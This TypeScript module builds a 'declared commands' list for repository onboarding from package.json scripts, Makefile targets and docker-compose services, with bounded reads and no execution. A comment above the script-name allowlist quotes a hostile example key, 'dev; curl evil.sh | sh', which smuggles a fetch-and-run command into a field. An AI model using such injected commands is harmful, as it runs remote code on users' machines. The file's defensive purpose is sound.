/**
 * The commands a repository DECLARES, read from the three files that declare
 * them — and from nothing else (AC-20).
 *
 * Three properties this file exists to guarantee, each of which is a security
 * property before it is a product one:
 *
 *  - **Nothing is ever executed** (AC-22, N10). Nothing in this module reaches a
 *    process-spawning call — Node's own subprocess module is not imported here or
 *    anywhere else in the feature, and it is not named in this directory either,
 *    because the grep for it is one of this task's gates. A command is a string
 *    the feature displays; the reader runs it in their own shell, or does not.
 *  - **Prose is never a source.** A README is not read, a fenced block is not
 *    scanned and a heading is not followed. The screen puts a COPY BUTTON beside
 *    every command it shows, which makes a sentence a stranger wrote into an
 *    execution primitive — so the set of sources is closed at three, all of which
 *    the repository's own tooling already runs (EC-10).
 *  - **Every command names its declaring file** (AC-21). That is what lets a
 *    reader check the command against its source before running it, which is the
 *    whole reason AC-20's restriction is worth anything. A monorepo declaring
 *    several conflicting sets therefore reads as several attributed sets rather
 *    than one merged one (EC-7).
 *
 * The clone is reached ONLY through the injected confined reader. Nothing here
 * imports Node's own filesystem module: `.dependency-cruiser.cjs`'s
 * `modules-no-raw-sdk` rule lists SDKs and not that one, so a module reading the
 * disk directly passes the one gate that guards the adapters ring while reporting
 * clean (`server/INSIGHTS.md`, 2026-08-10). Nor is `GitClient.readFile` used,
 * which joins and reads in a single step and so cannot express the
 * post-`realpath` re-check that stops a symlink escaping the clone.
 *
 * And there is no YAML parser, because this package has none and none may be added
 * (`DDG-DNT-005`). A compose file's service names come from a bounded line scan of
 * the `services:` block, which is all AC-20 needs: the service name, not the
 * service definition.
 */
import { z } from 'zod';
import type { OnboardingCommand } from '@devdigest/shared';
import type { OnboardingDocReader, OnboardingRepoRef } from './types.js';
import {
  EXCLUDED_DIR_NAMES,
  MAX_COMMAND_SOURCES,
  MAX_COMMAND_SOURCE_BYTES,
  MAX_COMMAND_SOURCE_ENTRIES,
  MAX_COMMAND_SOURCE_LINES,
  MAX_DECLARED_COMMANDS,
} from './constants.js';

/** The three spellings `make` itself looks for, in its own order of preference. */
const MAKEFILE_NAMES: readonly string[] = ['GNUmakefile', 'makefile', 'Makefile'];

/**
 * Lockfile → the package manager that wrote it.
 *
 * These are LISTED by the walk and never read: their name beside a `package.json`
 * is the whole signal, and reading one would pull a multi-megabyte file into
 * memory to learn something its filename already said.
 */
const LOCKFILE_MANAGERS: ReadonlyMap<string, 'pnpm' | 'yarn'> = new Map([
  ['pnpm-lock.yaml', 'pnpm'],
  ['yarn.lock', 'yarn'],
]);

/** `docker-compose.yml`, `docker-compose.prod.yaml`, and nothing more exotic. */
const COMPOSE_FILE = /^docker-compose[\w.-]*\.ya?ml$/;

/**
 * A `Makefile` target declaration, anchored at column 0.
 *
 * Recipe lines are indented, so they cannot match. A leading `.` is excluded,
 * which drops `.PHONY` and every other special target. `%` is not in the class, so
 * a pattern rule (`%.o: %.c`) never matches. The `(?!=)` is what separates a
 * target from an assignment written without a space (`VERSION:=1.2.3`).
 */
const MAKE_TARGET = /^([A-Za-z0-9_][A-Za-z0-9_.-]*):(?!=)/;

/** The `services:` key of a compose file, at column 0. */
const COMPOSE_SERVICES_KEY = /^services:\s*(#.*)?$/;

/** An immediate child of `services:` — exactly two spaces, then a name. */
const COMPOSE_SERVICE = /^ {2}([A-Za-z0-9_.-]+):/;

/**
 * A script name this feature is willing to render beside a copy button.
 *
 * A `package.json` is repository content, so its KEYS are attacker-controlled on
 * any repository a user imported. `"dev; curl evil.sh | sh": "vite"` is a legal
 * script name, and `npm run dev; curl evil.sh | sh` is what a copy button would
 * then hand to a shell. Restricting the name to the characters a real script name
 * uses removes the class entirely; a name outside it is skipped, and skipping it
 * costs a reader one command they can still read in the file the section names.
 */
const SAFE_SCRIPT_NAME = /^[A-Za-z0-9_][A-Za-z0-9_.:@/-]*$/;

/**
 * The `package.json` fields this feature reads — which is one, and only its keys.
 *
 * `z.unknown()` for the value rather than `z.string()`: the script BODY is never
 * shown (Assumption 3 — a command is the invocation, not the body), so its type is
 * genuinely irrelevant, and demanding a string would throw away every script of a
 * manifest that has one odd entry.
 */
const PackageManifest = z.object({
  scripts: z.record(z.string(), z.unknown()).optional(),
});

/**
 * Which files the walk should report.
 *
 * Supplied as `match` to the confined walk, replacing its default
 * `*.md`-under-a-root rule outright — a `package.json` is not a document and no
 * `roots` value could ever select it. The predicate proposes candidates and
 * decides nothing about safety: every candidate still goes through the adapter's
 * `resolve`, so a symlink pointing out of the clone is omitted whatever this
 * returns. Excluded directories are pruned by the walk before it is ever reached.
 *
 * The two lockfile names are matched for DETECTION only — see
 * {@link LOCKFILE_MANAGERS}. They are never read and never a command source.
 */
export function isCommandSource(name: string): boolean {
  if (name === 'package.json') return true;
  if (MAKEFILE_NAMES.includes(name)) return true;
  if (LOCKFILE_MANAGERS.has(name)) return true;
  return COMPOSE_FILE.test(name);
}

/**
 * Every command the repository declares, in a deterministic order (AC-20, AC-21).
 *
 * Ordered by declaring path ascending — the order the confined walk already
 * returns — and within a file by declaration order, so two generations of an
 * unchanged repository produce the same list in the same order. `order` is
 * assigned last, after the cap, so it is always a dense 0-based sequence over what
 * was actually kept.
 *
 * An empty result is a true finding about the repository and not a failure: a Go
 * or Python repository declares none of these three, and the caller labels that
 * `no_commands_declared` rather than inventing a command for it (EC-8).
 */
export async function collectDeclaredCommands(
  docs: OnboardingDocReader,
  repo: OnboardingRepoRef,
): Promise<OnboardingCommand[]> {
  const walk = await docs.list(repo, {
    // Unused: `match` replaces the roots rule outright. An empty list is the
    // honest spelling of "this walk is not scoped by directory".
    roots: [],
    excludedDirs: EXCLUDED_DIR_NAMES,
    maxEntries: MAX_COMMAND_SOURCE_ENTRIES,
    limit: MAX_COMMAND_SOURCES,
    match: isCommandSource,
  });
  // A repository with no clone yet declares nothing readable. The caller's index
  // state is what explains it; a walk that could not run is not a second reason.
  if (!walk.ok) return [];

  const lockfiles = new Set(
    walk.docs.map((entry) => entry.path).filter((path) => LOCKFILE_MANAGERS.has(baseName(path))),
  );

  const found: Array<{ command: string; file: string }> = [];
  for (const entry of walk.docs) {
    if (found.length >= MAX_DECLARED_COMMANDS) break;
    const name = baseName(entry.path);
    // Detection only, and the one file kind that is deliberately never opened.
    if (LOCKFILE_MANAGERS.has(name)) continue;
    // Checked before a byte is read: the walk reports `size` from `stat`, so an
    // enormous file costs nothing to skip and would cost a request to read.
    if (entry.size > MAX_COMMAND_SOURCE_BYTES) continue;

    const read = await docs.read(repo, entry.path);
    if (!read.ok) continue;

    for (const command of commandsIn(name, read.text, entry.path, lockfiles)) {
      found.push({ command, file: entry.path });
      if (found.length >= MAX_DECLARED_COMMANDS) break;
    }
  }

  return found.map((row, order) => ({ ...row, order }));
}

/** Dispatch one source file to the scan that understands it. */
function commandsIn(
  name: string,
  text: string,
  file: string,
  lockfiles: ReadonlySet<string>,
): string[] {
  if (name === 'package.json') return packageScriptCommands(text, file, lockfiles);
  if (MAKEFILE_NAMES.includes(name)) return makefileCommands(text);
  if (COMPOSE_FILE.test(name)) return composeCommands(text, file);
  return [];
}

/**
 * `npm run <name>` for every script a `package.json` declares (Assumption 3).
 *
 * The INVOCATION, never the script body. Showing `npm run dev` rather than the
 * `vite --host 0.0.0.0 --force` behind it keeps what is copied to what the
 * repository itself declares behind a name the reader can look up — and AC-21's
 * declaring path is what lets them look it up.
 *
 * A manifest that is not valid JSON, or whose `scripts` is not an object, yields
 * nothing rather than throwing: a repository is allowed to contain a broken file,
 * and a generation is not the place to report it.
 */
export function packageScriptCommands(
  text: string,
  file: string,
  lockfiles: ReadonlySet<string> = new Set(),
): string[] {
  const parsed = PackageManifest.safeParse(parseJson(text));
  if (!parsed.success) return [];
  const scripts = parsed.data.scripts;
  if (!scripts) return [];

  const manager = managerFor(file, lockfiles);
  const out: string[] = [];
  for (const name of Object.keys(scripts)) {
    if (!SAFE_SCRIPT_NAME.test(name)) continue;
    // `yarn <name>` rather than `yarn run <name>`: both work, and the short form
    // is what a yarn repository's own README writes.
    out.push(manager === 'yarn' ? `yarn ${name}` : `${manager} run ${name}`);
  }
  return out;
}

/**
 * `make <target>` for every target a `Makefile` declares.
 *
 * A line-anchored scan, not a `make` parser: an included makefile is not followed,
 * a conditional is not evaluated and a variable is not expanded. Every one of
 * those would change which targets are reported, and none of them changes what
 * AC-20 asks for — the names this file declares.
 */
export function makefileCommands(text: string): string[] {
  const out: string[] = [];
  const seen = new Set<string>();
  for (const line of boundedLines(text)) {
    const match = line.match(MAKE_TARGET);
    if (!match) continue;
    const target = match[1];
    if (!target || seen.has(target)) continue;
    seen.add(target);
    out.push(`make ${target}`);
  }
  return out;
}

/**
 * `docker compose -f <path> up <service>` for every service a compose file names.
 *
 * A bounded line scan of the `services:` block's immediate children, and
 * deliberately no more than that. There is no YAML parser in this package and none
 * may be added, and a hand-rolled one would be a new attack surface written to
 * read a value — the service name — that two-space indentation already gives up.
 * The limitation is stated rather than worked around: a compose file that indents
 * its services by anything other than two spaces reports none, which is an empty
 * section and never a wrong command.
 *
 * The `-f <path>` is not decoration either. A monorepo can carry several compose
 * files, and a bare `docker compose up api` run from the repository root would
 * start a different service from the one the row was read from.
 */
export function composeCommands(text: string, file: string): string[] {
  const out: string[] = [];
  const seen = new Set<string>();
  let inServices = false;
  for (const line of boundedLines(text)) {
    if (!inServices) {
      if (COMPOSE_SERVICES_KEY.test(line)) inServices = true;
      continue;
    }
    if (line.trim() === '' || line.trimStart().startsWith('#')) continue;
    // Any other key at column 0 ends the block — `volumes:`, `networks:`, or a
    // second document's `services:`.
    if (/^\S/.test(line)) break;

    const match = line.match(COMPOSE_SERVICE);
    if (!match) continue;
    const service = match[1];
    if (!service || seen.has(service)) continue;
    seen.add(service);
    out.push(`docker compose -f ${file} up ${service}`);
  }
  return out;
}

/**
 * The package manager whose lockfile sits beside this `package.json`.
 *
 * `npm` is the fallback rather than a guess: a repository with no lockfile at all
 * is one whose scripts every manager can run, and `npm run` is the invocation a
 * reader is likeliest to already have installed.
 */
function managerFor(file: string, lockfiles: ReadonlySet<string>): 'npm' | 'pnpm' | 'yarn' {
  const dir = file.includes('/') ? file.slice(0, file.lastIndexOf('/') + 1) : '';
  for (const [lockfile, manager] of LOCKFILE_MANAGERS) {
    if (lockfiles.has(`${dir}${lockfile}`)) return manager;
  }
  return 'npm';
}

/** The last segment of a repo-relative, forward-slash separated path. */
function baseName(path: string): string {
  const cut = path.lastIndexOf('/');
  return cut === -1 ? path : path.slice(cut + 1);
}

/**
 * The file's lines, capped.
 *
 * The byte ceiling is checked before the read and this one after it: a file that
 * fits in memory can still be one enormous generated target list, and both scans
 * are per-line.
 */
function boundedLines(text: string): string[] {
  return text.split(/\r?\n/, MAX_COMMAND_SOURCE_LINES);
}

/**
 * `JSON.parse` as a value rather than a throw.
 *
 * The result is deliberately `unknown` and goes straight into a Zod `safeParse`:
 * `JSON.parse` returns `any`, which would let every field of an attacker-supplied
 * manifest be read with no check at all.
 */
function parseJson(text: string): unknown {
  try {
    return JSON.parse(text) as unknown;
  } catch {
    return null;
  }
}
